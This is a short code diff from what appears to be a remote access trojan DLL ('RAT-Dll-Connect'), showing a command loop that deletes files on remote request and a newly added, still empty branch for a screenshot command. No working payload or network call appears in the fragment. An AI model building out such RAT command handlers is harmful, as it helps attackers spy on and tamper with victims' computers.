@@ -344,6 +344,12 @@ INT startListen()
 
                 OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed delete file!\n");
             }
+
+            else if (strcmp((const char*)&recvBuf, SCREENSHOT) == 0)
+            {
+
+
+            }
         }
 
         else if (status == 0)
